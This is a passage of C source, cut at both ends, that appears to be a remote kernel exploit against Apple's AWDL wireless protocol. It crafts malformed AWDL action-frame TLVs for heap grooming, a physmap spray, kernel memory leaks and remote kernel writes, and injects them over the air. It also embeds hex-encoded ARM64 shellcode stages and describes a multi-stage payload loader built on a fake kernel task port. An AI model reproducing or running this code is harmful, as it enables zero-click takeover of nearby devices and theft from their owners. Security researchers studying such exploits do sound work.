    if (memcmp(&hdr->bssid_addr, &awdl_bssid, 6) != 0) {
      log_msg("not for awdl_bssid");
      return; 
    }

    // is this an AWDL action frame?
    struct awdl_action* action_header = (struct awdl_action*)(hdr+1);
    remaining -= sizeof(struct ieee80211_hdr);

    if (remaining < sizeof(struct awdl_action)) {
      //log_msg("remaining less than sizeof awdl_action");
      return;
    }

    // some more checks that this really is an AWDL action frame:
    if (action_header->category != IEEE80211_VENDOR_SPECIFIC) {
      //log_msg("bad category (0x%0x), not AWDL", action_header->category);
      return;
    }

    if (memcmp(&action_header->oui, &awdl_oui, 3) != 0) {
      //log_msg("bad oui, not AWDL");
      return;
    }

    if (action_header->type != AWDL_TYPE) {
      //log_msg("type isn't AWDL");
      return;
    }

    if (action_header->version != AWDL_VERSION_COMPAT) {
      //log_msg("type isn't AWDL_VERSION_COMPAT (1,0)");
      return;
    }

    uint8_t subtype = action_header->subtype;
    if (subtype != AWDL_ACTION_PSF && subtype != AWDL_ACTION_MIF) {
      //log_msg("subtype isn't PSF or MIF (0x%x)", subtype);
      return;
    }

    // okay, this is a peer, lets signal that we found a peer
    // if anyone is waiting for one:
    
    pthread_mutex_lock(&force_enable_mutex);
    if (!waiting_for_new_peer) {
      // no one wants this, continue;
      printf("no one waiting for new peer\n");
      pthread_mutex_unlock(&force_enable_mutex);
      return;
    }

    memcpy(&sniffer_new_peer_mac, &hdr->src_addr, sizeof(struct ether_addr));

    // got it, signal the sleeping sender
    waiting_for_new_peer = 0;
    found_new_peer = 1;

    pthread_cond_signal(&force_enable_cond);

    pthread_mutex_unlock(&force_enable_mutex);

    // we're done now, break out of the packet sniffing loop
    pcap_breakloop(second_global_pcap_handle);
    return;
  } else {
    //printf("not ACK or AF\n");
  }

}

// takes ownership of pkt_in
static pkt_buf_t* REPEAT(pkt_buf_t* pkt_in, uint32_t n) {
  uint32_t elem_size = pkt_in->len;
  size_t total_size = sizeof(pkt_buf_t) + (n*elem_size);
  pkt_buf_t* pkt = malloc(total_size);
  pkt->len = (n*elem_size);

  for (uint32_t i = 0; i < n; i++) {
    memcpy(&pkt->buf[(i*elem_size)], pkt_in->buf, elem_size);
  }

  free(pkt_in);

  return pkt;
}


static pkt_buf_t* GLUE(pkt_buf_t* pkt_a, pkt_buf_t* pkt_b) {
  uint32_t total_elem_size = pkt_a->len + pkt_b->len;
  uint32_t total_size = total_elem_size + sizeof(pkt_buf_t);
  pkt_buf_t* pkt = malloc(total_size);
  pkt->len = total_elem_size;

  memcpy(&pkt->buf[0], pkt_a->buf, pkt_a->len);
  memcpy(&pkt->buf[pkt_a->len], pkt_b->buf, pkt_b->len);

  free(pkt_a);
  free(pkt_b);

  return pkt;
}

// radiotap header
static pkt_buf_t* RT() {
  return pkt_buf_wrap(u8aRadiotapHeader, sizeof(u8aRadiotapHeader));
}

// 80211 header
// two versions

static pkt_buf_t* WIFI(struct ether_addr dst_mac, struct ether_addr src_mac) {
  struct ieee80211_hdr hdr = {0};

  hdr.frame_control = IEEE80211_FTYPE_MGMT | IEEE80211_STYPE_ACTION;
  hdr.duration_id = 0;
  memcpy(&hdr.dst_addr, &dst_mac, 6);
  memcpy(&hdr.src_addr, &src_mac, 6);
  hdr.bssid_addr  = awdl_bssid;
  hdr.seq_ctrl    = 0;

  return pkt_buf_wrap(&hdr, sizeof(hdr));
}

static pkt_buf_t* AWDL() {
  struct awdl_action action = {0};

  action.category = IEEE80211_VENDOR_SPECIFIC;
  action.oui = awdl_oui;
  action.type = AWDL_TYPE;
  action.version = AWDL_VERSION_COMPAT;
  action.subtype = AWDL_ACTION_MIF;
  action.reserved = 0;
  action.phy_tx = clock_time_us();
  action.target_tx = action.phy_tx;

  return pkt_buf_wrap(&action, sizeof(action));
}


pkt_buf_t* SYNC_PARAMS() {
  struct awdl_sync_params_tlv sp = {0};

  sp.type = 4;
  sp.length = sizeof(struct awdl_sync_params_tlv) - 3;

  sp.next_aw_channel = 44;
  sp.tx_down_counter = 0x10;
  sp.master_channel = 44;
  sp.guard_time = 0;
  sp.aw_period = 0x10;
  sp.af_period = 0x6e;
  sp.flags = 0x1800;
  sp.aw_ext_length = 0x10;
  sp.aw_com_length = 0x10;
  sp.remaining_aw_length = 0;
  sp.min_ext = 3;
  sp.max_ext_multicast = 3;
  sp.max_ext_unicast = 3;
  sp.max_ext_af = 3;
  uint8_t master_mac[] = {0x44, 0x44, 0x44, 0x55, 0x55, 0x55};
  memcpy(&sp.master_addr, master_mac, 6);
  sp.presence_mode = 4;
  sp.reserved = 0;
  sp.next_aw_seq = 1234;
  sp.ap_alignment = 0;

  sp.count = 0xf;
  sp.encoding = 1;
  sp.duplicate_count = 0;
  sp.step_count = 3;
  sp.fill_channel = 0xffff;

  for (int i = 0; i < 16; i++) {
    //sp.seq[i] = 0x2b06;
    sp.seq[i] = 0x2e1d;
  }

  return pkt_buf_wrap(&sp, sizeof(sp));
}

pkt_buf_t* SYNC_PARAMS_6() {
  struct awdl_sync_params_tlv sp = {0};

  sp.type = 4;
  sp.length = sizeof(struct awdl_sync_params_tlv) - 3;

  sp.next_aw_channel = 6;
  sp.tx_down_counter = 0x10;
  sp.master_channel = 6;
  sp.guard_time = 0;
  sp.aw_period = 0x10;
  sp.af_period = 0x6e;
  sp.flags = 0x1800;
  sp.aw_ext_length = 0x10;
  sp.aw_com_length = 0x10;
  sp.remaining_aw_length = 0;
  sp.min_ext = 3;
  sp.max_ext_multicast = 3;
  sp.max_ext_unicast = 3;
  sp.max_ext_af = 3;
  uint8_t master_mac[] = {0x44, 0x44, 0x44, 0x55, 0x55, 0x55};
  memcpy(&sp.master_addr, master_mac, 6);
  sp.presence_mode = 4;
  sp.reserved = 0;
  sp.next_aw_seq = 1234;
  sp.ap_alignment = 0;

  sp.count = 0xf;
  sp.encoding = 1;
  sp.duplicate_count = 0;
  sp.step_count = 3;
  sp.fill_channel = 0xffff;

  for (int i = 0; i < 16; i++) {
    sp.seq[i] = 0x2b06;
    //sp.seq[i] = 0x2e1d;
  }

  return pkt_buf_wrap(&sp, sizeof(sp));
}

pkt_buf_t* SYNC_PARAMS_EMPTY() {
  struct awdl_sync_params_tlv sp = {0};

  sp.type = 4;
  sp.length = sizeof(struct awdl_sync_params_tlv) - 3;

  sp.next_aw_channel = 44;
  sp.tx_down_counter = 0x10;
  sp.master_channel = 44;
  sp.guard_time = 0;
  sp.aw_period = 0x10;
  sp.af_period = 0x6e;
  sp.flags = 0x1800;
  sp.aw_ext_length = 0x10;
  sp.aw_com_length = 0x10;
  sp.remaining_aw_length = 0;
  sp.min_ext = 3;
  sp.max_ext_multicast = 3;
  sp.max_ext_unicast = 3;
  sp.max_ext_af = 3;
  uint8_t master_mac[] = {0x44, 0x44, 0x44, 0x55, 0x55, 0x55};
  memcpy(&sp.master_addr, master_mac, 6);
  sp.presence_mode = 4;
  sp.reserved = 0;
  sp.next_aw_seq = 1234;
  sp.ap_alignment = 0;

  sp.count = 0xf;
  sp.encoding = 1;
  sp.duplicate_count = 0;
  sp.step_count = 3;
  sp.fill_channel = 0xffff;

  for (int i = 0; i < 16; i++) {
    //sp.seq[i] = 0x2b06;
    sp.seq[i] = 0;
  }

  return pkt_buf_wrap(&sp, sizeof(sp));
}

pkt_buf_t* SYNC_PARAMS_50() {
  struct awdl_sync_params_tlv sp = {0};

  sp.type = 4;
  sp.length = sizeof(struct awdl_sync_params_tlv) - 3;

  sp.next_aw_channel = 6;
  sp.tx_down_counter = 0x10;
  sp.master_channel = 6;
  sp.guard_time = 0;
  sp.aw_period = 0x10;
  sp.af_period = 0x6e;
  sp.flags = 0x1800;
  sp.aw_ext_length = 0x10;
  sp.aw_com_length = 0x10;
  sp.remaining_aw_length = 0;
  sp.min_ext = 3;
  sp.max_ext_multicast = 3;
  sp.max_ext_unicast = 3;
  sp.max_ext_af = 3;
  uint8_t master_mac[] = {0x44, 0x44, 0x44, 0x55, 0x55, 0x55};
  memcpy(&sp.master_addr, master_mac, 6);
  sp.presence_mode = 4;
  sp.reserved = 0;
  sp.next_aw_seq = 1234;
  sp.ap_alignment = 0;

  sp.count = 0xf;
  sp.encoding = 3;
  sp.duplicate_count = 0;
  sp.step_count = 3;
  sp.fill_channel = 0xffff;

  for (int i = 0; i < 16; i+=2) {
    sp.seq[i] = 0x2b06;
  }

  return pkt_buf_wrap(&sp, sizeof(sp));
}

pkt_buf_t* SYNC_PARAMS_50_ALT() {
  struct awdl_sync_params_tlv sp = {0};

  sp.type = 4;
  sp.length = sizeof(struct awdl_sync_params_tlv) - 3;

  sp.next_aw_channel = 6;
  sp.tx_down_counter = 0x10;
  sp.master_channel = 6;
  sp.guard_time = 0;
  sp.aw_period = 0x10;
  sp.af_period = 0x6e;
  sp.flags = 0x1800;
  sp.aw_ext_length = 0x10;
  sp.aw_com_length = 0x10;
  sp.remaining_aw_length = 0;
  sp.min_ext = 3;
  sp.max_ext_multicast = 3;
  sp.max_ext_unicast = 3;
  sp.max_ext_af = 3;
  uint8_t master_mac[] = {0x44, 0x44, 0x44, 0x55, 0x55, 0x55};
  memcpy(&sp.master_addr, master_mac, 6);
  sp.presence_mode = 4;
  sp.reserved = 0;
  sp.next_aw_seq = 1234;
  sp.ap_alignment = 0;

  sp.count = 0xf;
  sp.encoding = 3;
  sp.duplicate_count = 0;
  sp.step_count = 3;
  sp.fill_channel = 0xffff;

  for (int i = 1; i < 16; i+=2) {
    sp.seq[i] = 0x2b06;
  }

  return pkt_buf_wrap(&sp, sizeof(sp));
}

pkt_buf_t* SYNC_PARAMS_CUSTOM(int start, int cnt) {
  struct awdl_sync_params_tlv sp = {0};

  sp.type = 4;
  sp.length = sizeof(struct awdl_sync_params_tlv) - 3;

  sp.next_aw_channel = 6;
  sp.tx_down_counter = 0x10;
  sp.master_channel = 6;
  sp.guard_time = 0;
  sp.aw_period = 0x10;
  sp.af_period = 0x6e;
  sp.flags = 0x1800;
  sp.aw_ext_length = 0x10;
  sp.aw_com_length = 0x10;
  sp.remaining_aw_length = 0;
  sp.min_ext = 3;
  sp.max_ext_multicast = 3;
  sp.max_ext_unicast = 3;
  sp.max_ext_af = 3;
  uint8_t master_mac[] = {0x44, 0x44, 0x44, 0x55, 0x55, 0x55};
  memcpy(&sp.master_addr, master_mac, 6);
  sp.presence_mode = 4;
  sp.reserved = 0;
  sp.next_aw_seq = 1234;
  sp.ap_alignment = 0;

  sp.count = 0xf;
  sp.encoding = 3;
  sp.duplicate_count = 0;
  sp.step_count = 3;
  sp.fill_channel = 0xffff;

  for (int i = start; i < start+cnt; i++) {
    sp.seq[i] = 0x2b06;
  }

  return pkt_buf_wrap(&sp, sizeof(sp));
}

pkt_buf_t* DATAPATH(struct ether_addr src_mac) {
  struct data_path_tlv dp = {0};

  dp.type = 0xc;
  dp.len = sizeof(struct data_path_tlv) - 3;
  dp.flags = 0x8f24;
  memcpy(&dp.awdl_addr, &src_mac, 6);
  dp.country_code[0] = 'X';
  dp.country_code[1] = '0';
  dp.country_code[2] = 0;
  dp.social_channels = 1;
  dp.ext_flags = 0;

  return pkt_buf_wrap(&dp, sizeof(dp));
}

pkt_buf_t* UNICAST_DATAPATH(uint32_t flags) {
  struct unicast_data_path_tlv dp = {0};

  dp.type = 0xc;
  dp.length = sizeof(struct unicast_data_path_tlv) - 3;
  dp.flags = flags;
  memset(dp.country_code, 'A', 3);
  dp.social_channel_map = 1;
  uint8_t infra_bssid[] = {0x22, 0x12, 0x21, 0x12, 0x21, 0x12};
  memcpy(dp.infra_bssid, infra_bssid, 6);
  dp.infra_channel = 8;

  uint8_t infra_addr[] = {0x22, 0x33, 0x11, 0x12, 0x21, 0x12};
  memcpy(dp.infra_addr, infra_addr, 6);

  uint8_t awdl_addr[] = {0x22, 0x44, 0x11, 0x12, 0x21, 0x12};
  memcpy(dp.awdl_addr, awdl_addr, 6);

  dp.unicast_options = 0x44434241;

  return pkt_buf_wrap(&dp, sizeof(dp));
}


pkt_buf_t* BSS_STEERING(struct ether_addr* peer_macs, int n_peers) {
  struct bss_steering_tlv bs = {0};

  bs.type = 0x1d;
  bs.length = sizeof(struct bss_steering_tlv) - 3;

  bs.steeringMsgID = 6;
  bs.steeringMsgLen = sizeof(struct bss_steering_tlv)-3-8; // ??
  bs.peer_count = n_peers;

  for (int i = 0; i < n_peers; i++) {
    bs.peer_macs[i] = peer_macs[i];
  }

  uint8_t bssid[6] = {0x22, 0x33, 0x44, 0x55, 0x66, 0x77};
  memcpy(&bs.BSSID, bssid, 6);

  bs.steeringTimeoutThreshold = 1000;
  char* ssid_str = "FAKENET";
  bs.SSID_len = strlen(ssid_str);

  bs.infra_channel = 0x74; // 6;
  bs.steeringCmdFlags = 0x200;
  strcpy(bs.SSID, ssid_str);

  return pkt_buf_wrap(&bs, sizeof(bs));
}

pkt_buf_t* BSS_STEERING_0(struct ether_addr* peer_macs, int n_peers) {
  struct bss_steering_tlv bs = {0};

  bs.type = 0x1d;
  bs.length = sizeof(struct bss_steering_tlv) - 3;

  bs.steeringMsgID = 0;
  bs.steeringMsgLen = sizeof(struct bss_steering_tlv)-3-8; // ??
  bs.peer_count = n_peers;

  for (int i = 0; i < n_peers; i++) {
    bs.peer_macs[i] = peer_macs[i];
  }

  uint8_t bssid[6] = {0x22, 0x33, 0x44, 0x55, 0x66, 0x77};
  memcpy(&bs.BSSID, bssid, 6);

  bs.steeringTimeoutThreshold = 1000;
  char* ssid_str = "FAKENET";
  bs.SSID_len = strlen(ssid_str);

  bs.infra_channel = 0x74; // 6;
  bs.steeringCmdFlags = 0x200;
  strcpy(bs.SSID, ssid_str);

  return pkt_buf_wrap(&bs, sizeof(bs));
}

pkt_buf_t* HT_CAPS() {
  struct ht_caps_tlv ht = {0};
  ht.type = 7;
  ht.length = sizeof(struct ht_caps_tlv) - 3;

  ht.unk = 0;
  ht.ht_capabilities = 0x11ce; // these are from OWL
  ht.ampdu_capabilities = 0x1b;
  ht.rx_mcs = 0xff;
  ht.unk_2 = 0;

  return pkt_buf_wrap(&ht, sizeof(ht));
}
/*
pkt_buf_t* CHAN_SEQ() {
  struct chan_seq_tlv cs = {0};

  cs.type = 18;
  cs.length = sizeof(struct chan_seq_tlv) - 3;
  cs.count = 32;
  cs.encoding = 0;
  cs.duplicate_count = 0;
  cs.step_count = 3;
  cs.fill_channel = 0xffff;
  for (int i = 0; i < 32; i++) {
    cs.seq[(i*2)+0] = 6;
    cs.seq[(i*2)+1] = 0;
  }

  return pkt_buf_wrap(&cs, sizeof(cs));
}
*/

pkt_buf_t* CHAN_SEQ_EMPTY() {
  struct chan_seq_tlv cs = {0};

  cs.type = 18;
  cs.length = sizeof(struct chan_seq_tlv) - 3;
  cs.count = 0xf;
  cs.encoding = 1;
  cs.duplicate_count = 0;
  cs.step_count = 3;
  cs.fill_channel = 0xffff;
  for (int i = 0; i < 16; i++) {
      cs.seq[i] = 0;
  }

  return pkt_buf_wrap(&cs, sizeof(cs));
}
/*
pkt_buf_t* CHAN_SEQ_50() {
  struct chan_seq_tlv cs = {0};

  cs.type = 18;
  cs.length = sizeof(struct chan_seq_tlv) - 3;
  cs.count = 0xf;
  cs.encoding = 3;
  cs.duplicate_count = 0;
  cs.step_count = 3;
  cs.fill_channel = 0xffff;
  for (int i = 0; i < 32; i+=2) {
    cs.seq[(i*2)+0] = 0x06;
    cs.seq[(i*2)+1] = 0x2b;
  }

  return pkt_buf_wrap(&cs, sizeof(cs));
}

pkt_buf_t* CHAN_SEQ_50_ALT() {
  struct chan_seq_tlv cs = {0};

  cs.type = 18;
  cs.length = sizeof(struct chan_seq_tlv) - 3;
  cs.count = 0xf;
  cs.encoding = 3;
  cs.duplicate_count = 0;
  cs.step_count = 3;
  cs.fill_channel = 0xffff;
  for (int i = 1; i < 32; i+=2) {
    cs.seq[(i*2)+0] = 0x06;
    cs.seq[(i*2)+1] = 0x2b;
  }

  return pkt_buf_wrap(&cs, sizeof(cs));
}
*/
pkt_buf_t* SYNC_TREE(struct ether_addr* macs, uint32_t n_macs) {
  size_t total_size = 3+(n_macs*6);
  struct sync_tree_tlv* st = malloc(total_size); 

  st->type = 0x14;
  st->length = n_macs*6;

  memcpy(st->buf, macs, n_macs*6);

  pkt_buf_t* pb = pkt_buf_wrap(st, total_size);
  free(st);
  return pb;
}

struct service_response_leaker_tlv {
  uint8_t type;
  uint16_t len;
  uint16_t s_1;
  uint8_t key_buf[2];
  uint16_t v_1;
  uint16_t v_2;
  uint32_t val_buf[2];
} __attribute__((packed));

pkt_buf_t* SERV_RESP() {
  struct service_response_leaker_tlv sr = {0};

  sr.type = 2;
  sr.len = sizeof(struct service_response_leaker_tlv) - 3;
  sr.s_1 = 2;
  sr.key_buf[0] = 'A';
  sr.key_buf[1] = 'B';
  sr.v_1 = 95; // kalloc.96
  sr.v_2 = 0x0; // offset
  sr.val_buf[0] = 6; // msg_id
  sr.val_buf[1] = 0x320; // length

  return pkt_buf_wrap(&sr, sizeof(sr));
}

struct service_response_groom_tlv {
  uint8_t type;
  uint16_t len;
  uint16_t s_1;
  uint8_t key_buf[2];
  uint16_t v_1;
  uint16_t v_2;
  uint8_t val_buf[2];
} __attribute__((packed));

pkt_buf_t* SERV_RESP_GROOM(uint16_t kalloc_size) {
  struct service_response_groom_tlv sr = {0};

  sr.type = 2;
  sr.len = sizeof(struct service_response_groom_tlv) - 3;
  sr.s_1 = 2;
  sr.key_buf[0] = 'A';
  sr.key_buf[1] = 'B';
  sr.v_1 = kalloc_size;
  sr.v_2 = 0x0; // offset
  sr.val_buf[0] = 0x42;
  sr.val_buf[1] = 0x42;

  return pkt_buf_wrap(&sr, sizeof(sr));
}

struct service_response_physmap_spray_tlv {
  uint8_t type;
  uint16_t len;
  uint16_t s_1;
  uint8_t key_buf[2];
  uint16_t v_1;
  uint16_t v_2;
  uint32_t val_buf[2];
} __attribute__((packed)); // 19 bytes

pkt_buf_t* SERV_RESP_PHYSMAP(uint16_t kalloc_size) {
  struct service_response_physmap_spray_tlv sr = {0};

  sr.type = 2;
  sr.len = sizeof(struct service_response_physmap_spray_tlv) - 3;
  sr.s_1 = 2;
  sr.key_buf[0] = 'A';
  sr.key_buf[1] = 'B';
  sr.v_1 = kalloc_size;
  sr.v_2 = 0x0; // offset
  sr.val_buf[0] = 6; // msg_id
  sr.val_buf[1] = 0x320; // length

  return pkt_buf_wrap(&sr, sizeof(sr));
}

struct service_response_16k_tlv {
  uint8_t type;
  uint16_t len;
  uint16_t s_1;
  uint8_t key_buf[2];
  uint16_t v_1;
  uint16_t v_2;
  uint32_t val_buf[3];
} __attribute__((packed));

pkt_buf_t* SERV_RESP_16K() {
  struct service_response_16k_tlv sr = {0};

  sr.type = 2;
  sr.len = sizeof(struct service_response_16k_tlv) - 3;
  sr.s_1 = 2;
  sr.key_buf[0] = 'A';
  sr.key_buf[1] = 'B';
  sr.v_1 = 0x4000;
  sr.v_2 = 0x3ff4; // offset
  sr.val_buf[0] = rand32();
  sr.val_buf[1] = 6; // msg_id
  sr.val_buf[2] = 0x321; // length

  return pkt_buf_wrap(&sr, sizeof(sr));
}

struct service_response_16k_id_tlv {
  uint8_t type;
  uint16_t len;
  uint16_t s_1;
  uint8_t key_buf[2];
  uint16_t v_1;
  uint16_t v_2;
  uint32_t val_buf[4];
} __attribute__((packed));

pkt_buf_t* SERV_RESP_16K_ID(uint32_t val) {
  struct service_response_16k_id_tlv sr = {0};

  sr.type = 2;
  sr.len = sizeof(struct service_response_16k_id_tlv) - 3;
  sr.s_1 = 2;
  sr.key_buf[0] = 'A';
  sr.key_buf[1] = 'B';
  sr.v_1 = 0x4000;
  sr.v_2 = 0x1648; // offset
  sr.val_buf[0] = 6;  // msg_type
  sr.val_buf[1] = 0x320; // msg_id
  sr.val_buf[2] = 0x41414141; // marker
  sr.val_buf[3] = val; // value

  return pkt_buf_wrap(&sr, sizeof(sr));
}

pkt_buf_t* SERV_PARAM() {
  struct service_params_tlv sp = {0};

  sp.type = 6;
  sp.len = sizeof(struct service_params_tlv) - 3;
  sp.unk[0] = 0;
  sp.unk[1] = 0;
  sp.unk[2] = 0;
  sp.sui = 0;
  sp.bitmask = 0;

  return pkt_buf_wrap(&sp, sizeof(sp));
}

struct basic_tlv {
  uint8_t type;
  uint16_t len;
} __attribute__((packed));


pkt_buf_t* TLV_IGN(uint16_t total_len) {
  if (total_len < 3) {
    printf("an ignore TLV needs to be at least 3 bytes long\n");
    return NULL;
  }

  struct basic_tlv* tlv = (struct basic_tlv*) malloc(total_len);
  memset(tlv, 0, total_len);
  tlv->type = 0x49;
  tlv->len = total_len-3;
  memset(tlv+1, 0x49, total_len-3);

  pkt_buf_t* pkt_buf = pkt_buf_wrap(tlv, total_len);
  free(tlv);

  return pkt_buf;
}

struct nsync_tlv {
  uint8_t type;
  uint16_t len;
  uint8_t buf[61];
} __attribute__((packed));

pkt_buf_t* NSYNC(void* buf, uint32_t len) {
  if (len > 61) {
    printf("NSYNC tlv len too long\n");
    return NULL;
  }

  struct nsync_tlv nt = {0};

  nt.type = 0x17;
  nt.len = len;
  memcpy(nt.buf, buf, len);

  return pkt_buf_wrap(&nt, len+3);
}



/*
  equivilent to this psuedocode:

  uint64_t remote_kaddr = kalloc(kalloc_size);
  memcpy(remote_kaddr + offset, buf, len)
  leak(remote_kaddr);
  return remote_kaddr;
*/

struct service_response_kallocer_tlv {
  uint8_t type;
  uint16_t len;
  uint16_t key_len;
  uint8_t key_buf[2];
  uint16_t kalloc_size;
  uint16_t offset;
  uint8_t buf[0];
} __attribute__((packed));

pkt_buf_t* SERV_RESP_KALLOCER(void* buf, size_t len, uint16_t kalloc_size, uint16_t offset) {
  size_t total_size = sizeof(struct service_response_kallocer_tlv) + len;
  struct service_response_kallocer_tlv* sr = malloc(total_size);
  memset(sr, 0, total_size);

  sr->type = 2;
  sr->len = total_size-3;

  sr->key_len = 2;
  sr->key_buf[0] = 'A';
  sr->key_buf[1] = 'B';
  sr->kalloc_size = kalloc_size;
  sr->offset = offset;
  memcpy(sr->buf, buf, len);

  pkt_buf_t* pb = pkt_buf_wrap(sr, total_size);
  free(sr);
  return pb;
}

struct kmem_leak_params {
  struct ether_addr dst; 
  uint64_t peer_manager_kaddr;
};

struct kmem_leak_params kl_parm = {0};

void khexdump(uint64_t kaddr, uint64_t len) {
  return;
  //void* buf = arbitrary_read_fast(kaddr, len);
  //hexdump(buf, len);
  //free(buf);
}

void init_kmem_leak(struct ether_addr dst, uint64_t peer_manager_kaddr) {
  kl_parm.dst = dst;
  kl_parm.peer_manager_kaddr = peer_manager_kaddr;

  // fix up the queue so we can actually find stuff...
  uint64_t serv_resp_q = rk64(kl_parm.peer_manager_kaddr+0x2968);
  printf("serv_resp_q: 0x%016llx\n", serv_resp_q);
  khexdump(serv_resp_q, 0x50);

  wk16(serv_resp_q+0x30, 0xffff);
  
  khexdump(serv_resp_q, 0x50);
}

// this only works if the result is "incomplete" that it, either offset needs to be non-zero,
// or len needs to be less than kalloc size

uint16_t kmem_leak_peer_id = 0;
uint64_t copy_buffer_to_kmem(void* buf, size_t len, uint16_t kalloc_size, uint16_t offset) {
  struct ether_addr kmem_leak_peer =  *(ether_aton("22:99:33:71:00:00"));
  *(((uint16_t*)&kmem_leak_peer)+2) = kmem_leak_peer_id++;

  inject(RT(),
      WIFI(kl_parm.dst, kmem_leak_peer),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      SERV_RESP_KALLOCER(buf, len, kalloc_size, offset),
      HT_CAPS(),
      DATAPATH(kmem_leak_peer),
      PKT_END());

  // go find it:
  // TODO: actually walk the list to ensure the mac matches
  uint64_t serv_resp_q = rk64(kl_parm.peer_manager_kaddr+0x2968);
  printf("serv_resp_q: 0x%016llx\n", serv_resp_q);
  khexdump(serv_resp_q, 0x50);

  uint64_t buckets = rk64(serv_resp_q+0x48);
  printf("buckets: 0x%016llx\n", buckets);
  khexdump(buckets, 0x40);

  uint64_t elem = rk64(buckets+0x8);
  printf("elem: 0x%016llx\n", elem);
  khexdump(elem, 0x70);

  uint64_t ptr = rk64(elem+0x40);
  printf("ptr: 0x%016llx\n", ptr);
  
  // dump the bytes we wrote at offset:
  uint64_t hdr = rk64(ptr+offset);
  printf("hdr: 0x%016llx\n", hdr);
  
  return ptr;
}



uint32_t stage1[] = {
  0xa9ba6ffc,
  0xa90167fa,
  0xa9025ff8,
  0xa90357f6,
  0xa9044ff4,
  0xa9057bfd,
  0xd10d43ff,
  0xaa0003f3,
  0x90000017,
  0xf9413ae8,
  0x100012d4,
  0xd503201f,
  0xb27ffbe0,
  0xaa1403e1,
  0xd63f0100,
  0xaa0003e8,
  0x10001243,
  0xd503201f,
  0x320007e2,
  0xd2800000,
  0xd2800001,
  0xd63f0100,
  0xf9413ae8,
  0x700011e1,
  0xd503201f,
  0xb27ffbe0,
  0xd63f0100,
  0xaa0003e8,
  0x90000018,
  0xf9413f01,
  0x910083f6,
  0x910083e3,
  0x910063e4,
  0xaa1303e0,
  0x52806602,
  0xd63f0100,
  0xf9413ae8,
  0xb27ffbe0,
  0xaa1403e1,
  0xd63f0100,
  0xaa0003e8,
  0x50001063,
  0xd503201f,
  0x320007e2,
  0xd2800000,
  0xd2800001,
  0xd63f0100,
  0xb9402fe8,
  0x320037e9,
  0x0b082928,
  0x12124514,
  0xf9413ae8,
  0x10000fa1,
  0xd503201f,
  0xb27ffbe0,
  0xd63f0100,
  0xd63f0000,
  0xaa0003f5,
  0xf9413ae8,
  0x70000f21,
  0xd503201f,
  0xb27ffbe0,
  0xd63f0100,
  0xaa0003e8,
  0x910043e1,
  0xaa1503e0,
  0x320003e3,
  0xaa1403e2,
  0xd63f0100,
  0xb9402fe8,
  0x34000308,
  0xd2800019,
  0xd280001a,
  0x910042db,
  0x70000b96,
  0xd503201f,
  0xf9413ae8,
  0xb27ffbe0,
  0xaa1603e1,
  0xd63f0100,
  0xaa0003e8,
  0xf87a7b61,
  0xf9400be9,
  0x9276572a,
  0x8b0a0123,
  0x910063e4,
  0xaa1303e0,
  0x321603e2,
  0xd63f0100,
  0x9100075a,
  0xb9402fe8,
  0x91100339,
  0xeb08035f,
  0x54fffde3,
  0xd2882828,
  0xf2a82828,
  0xf2c82828,
  0xf2e82828,
  0xf90007e8,
  0xf9413ae8,
  0x10000aa1,
  0xd503201f,
  0xb27ffbe0,
  0xd63f0100,
  0xaa0003e8,
  0xf9400be0,
  0x910023e2,
  0xaa1403e1,
  0x321d03e3,
  0xd63f0100,
  0xaa0003f6,
  0xf9413ae8,
  0x10000601,
  0xd503201f,
  0xb27ffbe0,
  0xd63f0100,
  0xaa0003e8,
  0xf90003f6,
  0x70000883,
  0xd503201f,
  0x320007e2,
  0xd2800000,
  0xd2800001,
  0xd63f0100,
  0xf9413ae8,
  0xf90002c8,
  0x50000861,
  0xd503201f,
  0xb27ffbe0,
  0xd63f0100,
  0xaa0003e8,
  0xf9400be1,
  0xaa1503e0,
  0x52800003,
  0x528000a4,
  0xaa1403e2,
  0xd63f0100,
  0xf9400be8,
  0xf9413f01,
  0xaa1303e0,
  0xd63f0100,
  0x910d43ff,
  0xa9457bfd,
  0xa9444ff4,
  0xa94357f6,
  0xa9425ff8,
  0xa94167fa,
  0xa8c66ffc,
  0xd65f03c0,
  0xa9bf7bfd,
  0x52800000,
  0x97ffff69,
  0x52800540,
  0xa8c17bfd,
  0xd65f03c0,
  0xd503201f,
  0x41414141,
  0x41414141,
  0x42424242,
  0x42424242,
  0x5f6c7361,
  0x00676f6c,
  0x6c6c6568,
  0x7266206f,
  0x73206d6f,
  0x65676174,
  0x6d002131,
  0x5f686361,
  0x725f6d76,
  0x5f646165,
  0x7265766f,
  0x74697277,
  0x74730065,
  0x31656761,
  0x61657220,
  0x636b2064,
  0x00666e6f,
  0x6b736174,
  0x6c65735f,
  0x72745f66,
  0x6d007061,
  0x5f686361,
  0x615f6d76,
  0x636f6c6c,
  0x00657461,
  0x6d6d656d,
  0x73006d65,
  0x65676174,
  0x6c645f32,
  0x5f6d7973,
  0x72646461,
  0x3025203a,
  0x6c6c3631,
  0x616d0078,
  0x765f6863,
  0x72705f6d,
  0x6365746f,
  0x00000074};

uint32_t stage0[] = {
  0xaa0403f4,
  0xaa0503f5,
  0xd10043ff,
  0x18000360,
  0x528000e1,
  0x910003e2,
  0x58000448,
  0xd63f0100,
  0xb94003f3,
  0x2a1303e0,
  0x580002c1,
  0x18000282,
  0x910003e3,
  0x910023e4,
  0x58000288,
  0xd63f0100,
  0x2a1303e0,
  0x58000261,
  0xa9400fe2,
  0x58000268,
  0xd63f0100,
  0x580002e0,
  0x52880001,
  0x58000268,
  0xd63f0100,
  0x2a1303e0,
  0xaa1403e1,
  0xaa1503e2,
  0x58000208,
  0xd63f0100,
  0x49494949,
  0x43434343,
  0x41414141,
  0x41414141,
  0x42424242,
  0x42424242,
  0x46464646,
  0x46464646,
  0x47474747,
  0x47474747,
  0x48484848,
  0x48484848,
  0x4b4b4b4b,
  0x4b4b4b4b,
  0x4a4a4a4a,
  0x4a4a4a4a};

struct kconf {
  uint64_t kaslr_slide;
  uint32_t kbuf_size;
  uint32_t n_text_fragments;
  uint64_t text_fragments[100]; // upper limit
};

/*
because the remote arbitrary write is kinda slow we use a multi-stage approach to
get the final payload in to place:


 * each stage is first rebased and linked here
 * we build a fake kernel task port, which stage0 will use to bootstrap 


  userspace_addr is base of the page we'll use
  physmap_kaddr is that page in the physmap; writing to this kernel address writes to that userspace page

  stage0 goes at +0x3f00
  stage1 goes at +0x0000
  stage2 gets loaded on new pages

  we pass stage1 a kconf structure telling it where to find the 1024-byte fragments which make up stage2
*/




struct ipc_entry {
  uint64_t ie_object;
  uint32_t ie_bits;
  uint32_t ign0;
  uint32_t ign1;
